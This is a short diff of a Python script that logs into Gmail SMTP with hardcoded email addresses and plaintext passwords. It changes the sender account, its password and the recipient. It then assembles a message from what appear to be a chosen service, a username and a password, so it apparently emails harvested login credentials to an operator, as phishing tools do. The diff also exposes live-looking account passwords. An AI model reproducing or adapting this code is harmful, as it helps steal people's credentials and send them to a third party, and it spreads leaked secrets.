@@ -90,11 +90,11 @@ s = smtplib.SMTP_SSL('smtp.gmail.com', 465, context = context)
 #s.starttls() 
 
 
-sa = 'bertranddupont885@gmail.com'
-kl = 'bernard8.0'
+sa = 'derecknathan245@gmail.com'
+kl = '@zedeyep4w0rd'
 s.login(sa, kl) 
 
-ra = 'nathanjohan885@gmail.com'
+ra = 'bertranddupont885@gmail.com'
 if option != 4:
  connexion = cho + ' - ' + usn + ' - ' + usp
  msg = MIMEMultipart()
